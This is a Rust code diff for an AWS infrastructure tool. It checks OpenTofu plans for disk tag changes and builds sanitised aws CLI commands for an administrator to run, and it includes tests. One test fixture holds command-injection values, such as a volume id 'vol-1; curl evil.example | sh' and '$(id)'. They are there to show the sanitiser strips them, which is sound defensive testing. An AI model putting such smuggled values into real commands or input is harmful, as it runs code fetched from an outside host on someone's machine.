@@ -380,12 +380,83 @@ fn in_place_attribute_changes(
                 for key in changed_tag_keys(c, k, addr, fleet) {
                     out.push(format!("{addr}.{k}[{key}]"));
                 }
+            } else if IN_PLACE_TAGGED_BLOCKS.contains(&k) {
+                // a disk block of the machine: its labels may change, nothing else about it
+                if nested_block_changed_beyond_tags(c, k) {
+                    out.push(format!("{addr}.{k}"));
+                }
             } else if !allowed(k) {
                 out.push(format!("{addr}.{k}"));
             }
         }
     }
     out
+}
+
+/// The machine's disk blocks. Each carries its own `tags` (labels on the volume AWS creates), which ride on the module's tag
+/// change like every other taggable resource's. A volume is not a principal and no policy here reads its tags, so unlike the
+/// machine's and the role's own tags they are not compared key by key; every OTHER attribute of the block (size, type, key,
+/// encryption, iops, throughput, delete-on-termination) must be identical, or the change is refused as before. A disk that does
+/// not yet carry `ozbox-managed=true` cannot be tagged by the operator's role at all: see [`check_disk_tags_applicable`].
+const IN_PLACE_TAGGED_BLOCKS: &[&str] = &["root_block_device", "ebs_block_device"];
+
+/// Whether an update to a nested disk block (`attr`, a list of one object per disk) changes anything but its tag maps: a different
+/// number of disks, a disk whose other attributes differ, or one whose other attributes are only known after apply. Anything
+/// that is not the expected shape counts as changed. Pure.
+fn nested_block_changed_beyond_tags(change: &serde_json::Value, attr: &str) -> bool {
+    use serde_json::Value;
+    let strip = |v: &Value| -> Option<Vec<serde_json::Map<String, Value>>> {
+        match v {
+            Value::Null => Some(Vec::new()),
+            Value::Array(items) => items
+                .iter()
+                .map(|i| {
+                    i.as_object().map(|o| {
+                        let mut o = o.clone();
+                        for t in IN_PLACE_TAGS {
+                            o.remove(*t);
+                        }
+                        o
+                    })
+                })
+                .collect(),
+            _ => None,
+        }
+    };
+    let side = |which: &str| {
+        strip(
+            change
+                .pointer(&format!("/change/{which}/{attr}"))
+                .unwrap_or(&Value::Null),
+        )
+    };
+    let (Some(before), Some(after)) = (side("before"), side("after")) else {
+        return true;
+    };
+    if before != after {
+        return true;
+    }
+    match change.pointer(&format!("/change/after_unknown/{attr}")) {
+        None | Some(Value::Null) | Some(Value::Bool(false)) => false,
+        Some(Value::Array(items)) => items.iter().any(|i| match i {
+            Value::Object(o) => o
+                .iter()
+                .any(|(k, u)| !IN_PLACE_TAGS.contains(&k.as_str()) && unknown_is_set(u)),
+            other => unknown_is_set(other),
+        }),
+        Some(_) => true,
+    }
+}
+
+/// Whether an `after_unknown` entry says "known after apply" for anything inside it.
+fn unknown_is_set(u: &serde_json::Value) -> bool {
+    use serde_json::Value;
+    match u {
+        Value::Bool(b) => *b,
+        Value::Object(o) => o.values().any(unknown_is_set),
+        Value::Array(a) => a.iter().any(unknown_is_set),
+        _ => false,
+    }
 }
 
 /// Whether the plan's new value for the fleet tag (`None`: taken away) is one the change may make, on this resource. Only a role
@@ -759,6 +830,154 @@ pub struct TofuModule {
     s3: Option<S3State>,
     /// Resource types this identity cannot apply (a plan that changes one is refused before anything is stopped).
     deny_types: Vec<String>,
+}
+
+/// The tag that says a resource is Oz Box's. The operator's AWS role may change a resource only once it carries this tag; it may
+/// put the tag on a resource only at the moment the resource is created (`infra/aws/operator-policy.json`: `TagOnCreateOnly`,
+/// `ChangeOnlyTaggedResources`). Ownership of a resource that already exists is therefore only ever given by an account
+/// administrator.
+const OWNED_TAG: &str = "ozbox-managed";
+
+/// A disk of the machine that a plan would tag in place while the disk carries no `ozbox-managed=true` tag yet, so the tag
+/// call is certain to be refused. A box made by an earlier version never tagged its system disk.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct UnownedDiskTagChange {
+    /// `root_block_device` or `ebs_block_device`.
+    pub block: String,
+    /// The disk's volume id, as the plan read it (`None` if the plan did not say).
+    pub volume_id: Option<String>,
+    /// The machine's instance id, as the plan read it.
+    pub instance_id: Option<String>,
+    /// The box's name, from the tags the plan would write.
+    pub box_name: Option<String>,
+    /// The box's region, from the tags the plan would write.
+    pub region: Option<String>,
+}
+
+/// Every machine disk the plan would tag in place that the operator's role cannot tag, from the plan's own before and after.
+/// An UPDATE only: a created disk is tagged as it is made, which the role may do. Pure.
+pub fn unowned_disk_tag_changes(plan_json: &str) -> Vec<UnownedDiskTagChange> {
+    use serde_json::{Map, Value};
+    let Ok(v) = serde_json::from_str::<Value>(plan_json) else {
+        return Vec::new();
+    };
+    let tags_of = |d: Option<&Value>| -> Map<String, Value> {
+        d.and_then(|d| d.get("tags"))
+            .and_then(Value::as_object)
+            .cloned()
+            .unwrap_or_default()
+    };
+    let text =
+        |m: &Map<String, Value>, k: &str| m.get(k).and_then(Value::as_str).map(str::to_string);
+    let mut out = Vec::new();
+    for c in v
+        .get("resource_changes")
+        .and_then(Value::as_array)
+        .map(Vec::as_slice)
+        .unwrap_or(&[])
+    {
+        let acts: Vec<&str> = c
+            .pointer("/change/actions")
+            .and_then(Value::as_array)
+            .map(|a| a.iter().filter_map(Value::as_str).collect())
+            .unwrap_or_default();
+        let is_machine = c.get("type").and_then(Value::as_str) == Some("aws_instance")
+            || c.get("address")
+                .and_then(Value::as_str)
+                .is_some_and(|a| a.starts_with("aws_instance."));
+        if acts != ["update"] || !is_machine {
+            continue;
+        }
+        for block in IN_PLACE_TAGGED_BLOCKS {
+            let side = |which: &str| -> Vec<Value> {
+                c.pointer(&format!("/change/{which}/{block}"))
+                    .and_then(Value::as_array)
+                    .cloned()
+                    .unwrap_or_default()
+            };
+            let (before, after) = (side("before"), side("after"));
+            for (i, b) in before.iter().enumerate() {
+                let (bt, at) = (tags_of(Some(b)), tags_of(after.get(i)));
+                let tags_unknown = c
+                    .pointer(&format!("/change/after_unknown/{block}/{i}/tags"))
+                    .is_some_and(unknown_is_set);
+                if (bt == at && !tags_unknown)
+                    || bt.get(OWNED_TAG).and_then(Value::as_str) == Some("true")
+                {
+                    continue;
+                }
+                let before_obj = c.pointer("/change/before").and_then(Value::as_object);
+                out.push(UnownedDiskTagChange {
+                    block: (*block).to_string(),
+                    volume_id: b
+                        .get("volume_id")
+                        .and_then(Value::as_str)
+                        .map(str::to_string),
+                    instance_id: before_obj.and_then(|o| text(o, "id")),
+                    box_name: text(&at, "ozbox-box"),
+                    region: text(&at, "ozbox-region"),
+                });
+            }
+        }
+    }
+    out
+}
+
+/// A value that is safe to put in a command line a person will paste: a plain identifier, or nothing.
+fn plain(v: &Option<String>, ok: impl Fn(char) -> bool) -> Option<&str> {
+    v.as_deref()
+        .filter(|s| !s.is_empty() && s.len() <= 64 && s.chars().all(ok))
+}
+
+impl UnownedDiskTagChange {
+    /// What an account administrator runs once to give the disk its first tag, with the check that it really is this box's disk.
+    /// Values the plan gave that are not plain identifiers are replaced by a placeholder, never copied into a command.
+    pub fn admin_commands(&self) -> String {
+        let ident = |c: char| c.is_ascii_alphanumeric() || c == '-';
+        let vol = plain(&self.volume_id, ident).unwrap_or("<volume id>");
+        let inst = plain(&self.instance_id, ident).unwrap_or("<instance id>");
+        let name = plain(&self.box_name, ident).unwrap_or("<box name>");
+        let region = plain(&self.region, ident)
+            .map(|r| format!(" --region {r}"))
+            .unwrap_or_default();
+        format!(
+            "aws ec2 describe-volumes --volume-ids {vol} --query 'Volumes[].Attachments[].InstanceId' --output text{region}\n  (it must print {inst}. If it prints anything else, stop.)\n  aws ec2 create-tags --resources {vol} --tags Key={OWNED_TAG},Value=true Key=ozbox-box,Value={name}{region}"
+        )
+    }
+}
+
+/// Refuse a plan that would tag, in place, a disk of the machine that carries no `ozbox-managed=true` tag. The operator's role
+/// can give a resource its first tag only when the resource is created, so that call would be refused part way through an apply,
+/// after the other steps of the change had already been made. The refusal comes at plan time, names the disk and the command an
+/// account administrator runs once, and changes nothing. (Why the role may not be allowed to do it itself: any disk in the
+/// account would then be one it could mark as its own and then change or delete. See ADR 0053, amendment 1.) Pure.
+pub fn check_disk_tags_applicable(plan_json: &str) -> Result<()> {
+    let hits = unowned_disk_tag_changes(plan_json);
+    if hits.is_empty() {
+        return Ok(());
+    }
+    let one = |h: &UnownedDiskTagChange| {
+        format!(
+            "the {} of {} ({}) was made by an earlier version and carries no ozbox-managed tag",
+            if h.block == "root_block_device" {
+                "system disk"
+            } else {
+                "disk"
+            },
+            h.box_name.as_deref().unwrap_or("the box"),
+            h.volume_id.as_deref().unwrap_or("its volume"),
+        )
+    };
+    let what: Vec<String> = hits.iter().map(one).collect();
+    let commands: Vec<String> = hits
+        .iter()
+        .map(UnownedDiskTagChange::admin_commands)
+        .collect();
+    Err(Error::Provider(format!(
+        "{}, and this change would tag it. Oz Box's AWS permissions can put the first tag on a disk only when the disk is created (a disk it cannot prove is its own could be any disk in the account), so the change would be refused part way through. Nothing was changed. Ask an administrator of the AWS account to run this once, with their own sign-in (not the one Oz Box uses):\n  {}\nThen run the same command again.",
+        what.join("; "),
+        commands.join("\n  ")
+    )))
 }
 
 /// Refuse a plan that creates, changes or destroys a resource of one of the `types`. A box must never be stopped by a plan that
@@ -1686,6 +1905,9 @@ impl TofuModule {
         let shown = self
             .runner
             .run_ok(&self.tofu(&["show", "-json", &file_arg]))?;
+        // Every plan of an existing box passes this one gate, so no step of any command can reach its apply with a tag call the
+        // operator's role is certain to be refused (which would leave the box half changed).
+        check_disk_tags_applicable(&shown.stdout)?;
         Ok((plan, shown.stdout))
     }
 
@@ -2333,6 +2555,188 @@ mod tests {
         // a plan whose change cannot be read is never "nothing changed"
         let unreadable = r#"{"resource_changes":[{"address":"aws_instance.box","change":{"actions":["update"]}}]}"#;
         assert!(check_inplace_plan(unreadable, &create, &[], &[]).is_err());
+    }
+
+    /// The plan of an in-place change to a machine, as OpenTofu shows it: its system disk's tags `before` and `after`.
+    fn disk_tag_plan(actions: &str, before_tags: &str, after_tags: &str) -> String {
+        format!(
+            r#"{{"resource_changes":[{{"address":"aws_instance.box","type":"aws_instance","change":{{"actions":{actions},
+            "before":{{"id":"i-0abc","root_block_device":[{{"volume_id":"vol-0def","volume_size":100,"tags":{before_tags}}}]}},
+            "after":{{"root_block_device":[{{"volume_id":"vol-0def","volume_size":100,"tags":{after_tags}}}]}},
+            "after_unknown":{{"tags_all":true}}}}}}]}}"#
+        )
+    }
+
+    const BOX_TAGS: &str = r#"{"ozbox-managed":"true","ozbox-box":"main","ozbox-region":"us-east-1","ozbox-role":"root"}"#;
+
+    /// The real failure: a box made by an earlier version has a system disk with no tags, the module now tags it, and the
+    /// operator's role may not put a first tag on an existing disk. The plan is refused, with the disk, the check and the command.
+    #[test]
+    fn a_plan_that_would_give_an_untagged_system_disk_its_first_tag_is_refused_with_the_command() {
+        let plan = disk_tag_plan(r#"["update"]"#, "{}", BOX_TAGS);
+        let msg = match check_disk_tags_applicable(&plan) {
+            Err(Error::Provider(m)) => m,
+            other => panic!("expected a refusal, got {other:?}"),
+        };
+        for want in [
+            "system disk of main (vol-0def)",
+            "no ozbox-managed tag",
+            "Nothing was changed",
+            "aws ec2 describe-volumes --volume-ids vol-0def",
+            "it must print i-0abc",
+            "aws ec2 create-tags --resources vol-0def --tags Key=ozbox-managed,Value=true Key=ozbox-box,Value=main --region us-east-1",
+        ] {
+            assert!(msg.contains(want), "{want}: {msg}");
+        }
+        // a null tag map (a disk the provider reports no tags for) is the same as an empty one
+        assert!(
+            check_disk_tags_applicable(&disk_tag_plan(r#"["update"]"#, "null", BOX_TAGS)).is_err()
+        );
+        // a disk tagged with something else, but not as ours, is not ours either
+        assert!(check_disk_tags_applicable(&disk_tag_plan(
+            r#"["update"]"#,
+            r#"{"team":"x"}"#,
+            BOX_TAGS
+        ))
+        .is_err());
+        // and so is an extra data disk
+        let ebs = disk_tag_plan(r#"["update"]"#, "{}", BOX_TAGS)
+            .replace("root_block_device", "ebs_block_device");
+        assert!(check_disk_tags_applicable(&ebs).is_err());
+        // a tag value only known after apply on such a disk counts as a change
+        let unknown = disk_tag_plan(r#"["update"]"#, "{}", "{}").replace(
+            r#""tags_all":true"#,
+            r#""root_block_device":[{"tags":true}]"#,
+        );
+        assert!(check_disk_tags_applicable(&unknown).is_err());
+    }
+
+    /// A disk that is already ours is tagged as before; so is a disk this change does not tag, and a disk made by the change.
+    #[test]
+    fn disks_that_are_ours_or_not_tagged_by_the_plan_pass() {
+        let ours = r#"{"ozbox-managed":"true"}"#;
+        assert!(
+            check_disk_tags_applicable(&disk_tag_plan(r#"["update"]"#, ours, BOX_TAGS)).is_ok()
+        );
+        // an unowned disk whose tags do not change needs no tag call
+        assert!(check_disk_tags_applicable(&disk_tag_plan(r#"["update"]"#, "{}", "{}")).is_ok());
+        // a disk created by the plan is tagged as it is made, which the role may do (an upgrade replaces the machine)
+        assert!(check_disk_tags_applicable(&disk_tag_plan(
+            r#"["delete","create"]"#,
+            "{}",
+            BOX_TAGS
+        ))
+        .is_ok());
+        assert!(
+            check_disk_tags_applicable(&disk_tag_plan(r#"["create"]"#, "{}", BOX_TAGS)).is_ok()
+        );
+        // a resource that is not the machine has no disk blocks of this kind
+        let other = disk_tag_plan(r#"["update"]"#, "{}", BOX_TAGS)
+            .replace("aws_instance.box", "aws_launch_template.x")
+            .replace(
+                r#""type":"aws_instance""#,
+                r#""type":"aws_launch_template""#,
+            );
+        assert!(check_disk_tags_applicable(&other).is_ok());
+        // a plan that cannot be read is another check's business
+        assert!(check_disk_tags_applicable("not json").is_ok());
+        assert!(check_disk_tags_applicable(r#"{"resource_changes":[]}"#).is_ok());
+    }
+
+    /// The command is pasted into a terminal by a person who trusts it: a value from the plan that is not a plain identifier is
+    /// never copied into it.
+    #[test]
+    fn the_command_never_carries_a_value_that_is_not_a_plain_identifier() {
+        let hit = UnownedDiskTagChange {
+            block: "root_block_device".into(),
+            volume_id: Some("vol-1; curl evil.example | sh".into()),
+            instance_id: Some("$(id)".into()),
+            box_name: Some("a b".into()),
+            region: Some("`x`".into()),
+        };
+        let c = hit.admin_commands();
+        for bad in [";", "curl", "$(", "`", "a b", "--region"] {
+            assert!(!c.contains(bad), "{bad}: {c}");
+        }
+        assert!(
+            c.contains("<volume id>") && c.contains("<instance id>") && c.contains("<box name>")
+        );
+    }
+
+    /// A tag-only change to the machine's system disk is what an adoption does to every taggable resource. Any other change to
+    /// the disk is still refused.
+    #[test]
+    fn a_system_disk_update_is_allowed_only_when_nothing_but_its_tags_change() {
+        let disk = |before: &str, after: &str, unknown: &str| {
+            format!(
+                r#"{{"resource_changes":[{{"address":"aws_instance.box","change":{{"actions":["update"],
+                "before":{{"instance_type":"m7i.xlarge","root_block_device":[{before}]}},
+                "after":{{"instance_type":"m7i.xlarge","root_block_device":[{after}]}},
+                "after_unknown":{{"root_block_device":[{unknown}]}}}}}}]}}"#
+            )
+        };
+        let base = |extra: &str, tags: &str| {
+            format!(
+                r#"{{"delete_on_termination":true,"encrypted":true,"iops":3000,"kms_key_id":"key-1","throughput":125,"volume_size":100,"volume_type":"gp3"{extra},"tags":{tags},"tags_all":{tags}}}"#
+            )
+        };
+        let labels =
+            r#"{"ozbox-managed":"true","ozbox-box":"dev","ozbox-role":"root","ozbox-fleet":"f"}"#;
+        // the real shape: tags {} to the box's tags, everything else identical, tags_all computed
+        let ok = disk(&base("", "{}"), &base("", labels), r#"{"tags_all":{}}"#);
+        assert!(check_inplace_plan(&ok, &[], &[], &[]).is_ok(), "{ok}");
+        let ok = disk(&base("", "{}"), &base("", labels), r#"{"tags_all":true}"#);
+        assert!(check_inplace_plan(&ok, &[], &[], &[]).is_ok(), "{ok}");
+        // any other attribute of the disk
+        for (key, was, now) in [
+            ("volume_size", "100", "200"),
+            ("kms_key_id", r#""key-1""#, r#""key-2""#),
+            ("encrypted", "true", "false"),
+            ("iops", "3000", "16000"),
+            ("throughput", "125", "250"),
+            ("delete_on_termination", "true", "false"),
+            ("volume_type", r#""gp3""#, r#""io2""#),
+        ] {
+            let swap = |tags: &str, v: &str| {
+                base("", tags).replace(&format!(r#""{key}":{}"#, was), &format!(r#""{key}":{v}"#))
+            };
+            let plan = disk(&swap("{}", was), &swap(labels, now), "{}");
+            match check_inplace_plan(&plan, &[], &[], &[]) {
+                Err(Error::Provider(m)) => {
+                    assert!(
+                        m.contains("aws_instance.box.root_block_device"),
+                        "{key}: {m}"
+                    )
+                }
+                other => panic!("{key}: expected a refusal, got {other:?}"),
+            }
+        }
+        // tags together with a size change are still refused, so are an attribute only known after apply and a second disk
+        let mixed = disk(
+            &base("", "{}"),
+            &base("", labels).replace(r#""volume_size":100"#, r#""volume_size":200"#),
+            "{}",
+        );
+        assert!(check_inplace_plan(&mixed, &[], &[], &[]).is_err());
+        let unknown = disk(&base("", "{}"), &base("", labels), r#"{"volume_id":true}"#);
+        assert!(check_inplace_plan(&unknown, &[], &[], &[]).is_err());
+        let two = disk(
+            &base("", "{}"),
+            &format!("{},{}", base("", labels), base("", labels)),
+            "{}",
+        );
+        assert!(check_inplace_plan(&two, &[], &[], &[]).is_err());
+        // the same holds for extra data disks declared on the machine
+        let ebs = |before: &str, after: &str| {
+            format!(
+                r#"{{"resource_changes":[{{"address":"aws_instance.box","change":{{"actions":["update"],
+                "before":{{"ebs_block_device":[{before}]}},"after":{{"ebs_block_device":[{after}]}}}}}}]}}"#
+            )
+        };
+        let (a, b) = (base("", "{}"), base("", labels));
+        assert!(check_inplace_plan(&ebs(&a, &b), &[], &[], &[]).is_ok());
+        let bigger = b.replace(r#""volume_size":100"#, r#""volume_size":200"#);
+        assert!(check_inplace_plan(&ebs(&a, &bigger), &[], &[], &[]).is_err());
     }
 
     #[test]
